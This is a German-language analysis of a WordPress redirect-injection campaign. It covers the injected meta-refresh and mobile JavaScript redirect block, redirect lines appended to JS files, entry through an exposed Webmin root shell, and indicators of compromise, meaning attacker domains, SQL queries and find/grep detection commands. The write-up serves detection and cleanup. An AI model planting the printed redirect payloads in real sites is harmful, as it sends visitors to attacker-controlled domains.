# Anatomie des Angriffs

Wie die Kampagne funktioniert, woran man sie erkennt und warum die Werkzeuge
so gebaut sind, wie sie gebaut sind.

---

## Symptom

Die Startseite leitet nach etwa sieben Sekunden auf eine fremde Kurz-URL um.
Auf Mobilgeräten sofort.

---

## Die Nutzlast

Jeder Zeile in `wp_posts.post_content` wird derselbe Block vorangestellt:

```html
<meta http-equiv="refresh" content="7; url=https://BÖSE.DOMAIN/TOKEN" />
<script>(window.matchMedia("(pointer:coarse)").matches
  ||/Android|iPhone|iPad|.../i.test(navigator.userAgent))
  &&location.replace("https://BÖSE.DOMAIN/TOKEN");</script>\r\n
```

Der `<meta>`-Tag erwischt Desktop-Besucher nach sieben Sekunden, das Skript
leitet Touch-Geräte sofort weiter. Nach dem Block folgt ein `\r\n`, dann der
echte Inhalt — diese Trennstelle ist der Ansatzpunkt der Bereinigung.

---

## Warum Datenbankzugriff, nicht PHP-Backdoor

Vier Indizien, die zusammen eindeutig sind:

| Beobachtung | Schlussfolgerung |
|---|---|
| `post_modified` unverändert, Zeilen von 2022 betroffen | WordPress hat nicht gespeichert |
| `wp_global_styles`, `wp_navigation`, `oembed_cache` betroffen | Zeilentypen, die WordPress so nie schreibt |
| `core verify-checksums` sauber, keine mu-plugins, kein `eval` | keine veränderte Datei |
| `home` in `wp_options` umgebogen | ein einzelnes `UPDATE` |

Der Eintrag, der es endgültig zeigte: ein Auto-Draft mit
`guid = https://BÖSE.DOMAIN/TOKEN/?p=33`. WordPress bildet guids aus der
`home`-Option — die war also bereits verbogen, als die Zeile entstand.

---

## Einstiegsweg

Ein aus dem Internet erreichbares Webmin auf Port 10000. Webmin läuft als root
und bringt eine Browser-Shell (`/xterm/`) sowie ein MySQL-Modul mit. Damit sind
blanke `UPDATE`-Anweisungen ohne jeden Dateizugriff möglich — genau das Bild,
das die Befunde zeigen.

Im untersuchten Fall: ein fehlgeschlagener Anmeldeversuch, acht Sekunden später
erfolgreicher root-Login. **Nur ein** Fehlversuch — ein Brute-Force-Angriff
hinterlässt hunderte. Wer hier hereinkam, kannte das Passwort bereits.

> Eine Browser-Shell bedeutet root-Zugriff, und deren Eingaben stehen in
> **keinem** Log. Was in dieser Zeit geschah, lässt sich nicht rekonstruieren.

---

## Vier Verbreitungswege

Die Datenbanknutzlast ist nur einer davon. Eine reine Datenbankbereinigung
lässt die übrigen unberührt — die Seite leitet dann nach dem Aufräumen weiter
weiter.

**1. `post_content` in der Datenbank** — der Hauptweg, siehe oben.

**2. Die `home`-Option.** Wird sie umgebogen, baut WordPress *jeden* Link und
jede Asset-Adresse mit der Schaddomain. Das ist auch die Erklärung für den
häufigen Nebeneffekt „Seite ohne Formatierung": Alle Stylesheets laufen ins
Leere.

**3. Angehängt ans Ende von JS-Dateien:**

```javascript
window.location.href = "//https://BÖSE.DOMAIN/TOKEN";
```

Das doppelte `//` vor dem Protokoll ist der stärkste Einzelmarker — so
schreibt kein Entwickler eine URL.

**4. Gefälschte „Coming soon"-Seiten** als `.htm`, `.html` und `.php`. In einer
WordPress-Installation sind statische HTML-Dateien ohnehin unüblich.

---

## Nebenbefunde

**Verwaiste WP-Cron-Hooks** mit Zufallsnamen wie `hzorj91jc31tmgsbtay`,
stündlich, ohne registrierenden Code. Ohne Code am Hook passiert nichts — aber
der Name ist ein zuverlässiger Marker, und die Einträge stammen ebenfalls aus
einem direkten Schreibvorgang in `wp_options.cron`.

**Zwischengespeichertes oEmbed-Markup.** Während `home` verbogen war, baute
WordPress seine Embed-Caches gegen die Schaddomain:

```html
<blockquote class="wp-embedded-content" data-secret="…">…</blockquote>
<iframe … style="… visibility: hidden;" …></iframe>
```

Maschinell erzeugt, kein eigener Text.

**Datenbank-Dumps im Webverzeichnis.** Über den Browser abrufbar, mit
Passwort-Hashes darin. Oft von der eigenen Bereinigungsarbeit übriggeblieben.

---

## Drei Konsequenzen für die Werkzeuge

**Die Zieldomain unterscheidet sich pro Seite.** Im untersuchten Fall drei
Installationen, drei verschiedene Domains derselben Kampagne. Ein Scan mit fest
vorgegebener Domain meldet betroffene Seiten fälschlich als sauber — deshalb
liest das Skript sie aus der Nutzlast.

**Generische Muster halten länger als Domainlisten.** `<meta http-equiv=`,
`"//http`, Zufallsnamen bei Cron-Hooks — die überdauern jeden Domainwechsel.

**Zeilenweises Löschen ist bei JS gefährlich.** Minifizierte Dateien bestehen
oft aus einer einzigen Zeile; wird die Injektion daran angehängt, zerstört ein
`grep -v` das gesamte Skript. Herausgeschnitten wird deshalb gezielt die
eingeschleuste Anweisung.

---

## Indikatoren

### Domains

Im eigenen Vorfall beobachtet:

```
urshort.com
ushort.company
ushort.org
```

Von Sal Aguilar (WPSecurityAnalyzer) im Mai 2026 zur selben Kampagne
veröffentlicht:

```
u-short.net
urshort.live
ushort.com
ushort.dev
ushort.info
ushort.observer
ushort.today
```

Vollständige, maschinenlesbare Liste:
[`blocklist-domains.txt`](https://github.com/mradeka/wp-redirect-toolkit/blob/main/blocklist-domains.txt)

> `ushort.com` vor dem Sperren prüfen — kurze generische Domains wechseln den
> Besitzer, und eine Fehlsperre fällt im Betrieb erst spät auf.

Die Pfade folgen dem Muster `/[A-Za-z0-9]{10}` mit angehängter Kennung
(`0r2`, `0r3`, `0r4`, `0r5`), die offenbar die Angriffswelle nummeriert.

### Suchmuster

```sql
SELECT COUNT(*) FROM wp_posts  WHERE post_content LIKE '<meta http-equiv=%';
SELECT option_name FROM wp_options WHERE option_value LIKE '%ushort%';
```

```bash
# JS: nur das Dateiende, dort sitzt die Injektion
find . -name '*.js' -exec sh -c 'tail -c 800 "$1" | grep -q "\"//https\?:" && echo "$1"' _ {} \;

# Landeseiten
find . -maxdepth 3 \( -name '*.htm' -o -name '*.html' \) \
     ! -path '*/wp-content/themes/*' -exec grep -l 'http-equiv.*refresh' {} +
```

### Weitere Marker

- Cron-Hooks: 12+ Zeichen, Buchstaben und Ziffern gemischt, keine Trennzeichen
- `home` und `siteurl` verweisen auf verschiedene Hosts
- `post_content` beginnt mit `<meta http-equiv="refresh"`
- Auto-Drafts, deren `guid` eine fremde Domain enthält
